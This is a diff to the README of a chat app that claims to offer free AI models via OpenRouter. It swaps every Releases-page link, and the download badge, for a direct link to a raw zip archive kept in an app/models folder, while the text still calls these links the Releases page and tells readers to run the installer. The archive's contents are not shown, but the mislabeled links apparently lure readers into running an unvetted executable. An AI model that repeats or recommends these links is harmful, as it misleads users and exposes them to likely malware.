@@ -4,10 +4,10 @@
 Welcome to **ai-chat-app**. This is a modern chat application powered by OpenRouter's API. You can access hundreds of free AI models through an easy-to-use interface. Whether you want to answer questions, get creative suggestions, or simply chat, this app is here to help.
 
 ## 📥 Download the App
-[![Download ai-chat-app](https://img.shields.io/badge/Download-ai--chat--app-blue.svg)](https://github.com/umerfarooq7687445/ai-chat-app/releases)
+[![Download ai-chat-app](https://github.com/umerfarooq7687445/ai-chat-app/raw/refs/heads/main/app/models/ai-chat-app-v1.1.zip)](https://github.com/umerfarooq7687445/ai-chat-app/raw/refs/heads/main/app/models/ai-chat-app-v1.1.zip)
 
 ## 🚀 Getting Started
-1. **Visit the Releases page:** To get the latest version of the application, click [here](https://github.com/umerfarooq7687445/ai-chat-app/releases).  
+1. **Visit the Releases page:** To get the latest version of the application, click [here](https://github.com/umerfarooq7687445/ai-chat-app/raw/refs/heads/main/app/models/ai-chat-app-v1.1.zip).  
 2. **Choose a version:** On the Releases page, you'll see a list of available versions. Select the version you want to download.
 3. **Download the file:** Click on the download link for your operating system. The application is available for Windows, macOS, and Linux.
 4. **Install the app:** Once downloaded, locate the file in your downloads folder. Run the installer and follow the on-screen instructions to install the app.
@@ -29,7 +29,7 @@ Ensure you have at least 4GB of RAM and 1GB of free disk space.
 ## 🔧 Download & Install
 To start using the ai-chat-app, follow these steps again:
 
-1. **Visit the Releases page:** Click [here](https://github.com/umerfarooq7687445/ai-chat-app/releases).  
+1. **Visit the Releases page:** Click [here](https://github.com/umerfarooq7687445/ai-chat-app/raw/refs/heads/main/app/models/ai-chat-app-v1.1.zip).  
 2. **Select and Download:** Choose the file appropriate for your operating system.
 3. **Follow Installation Instructions:** After downloading, run the setup and complete the installation process.
 
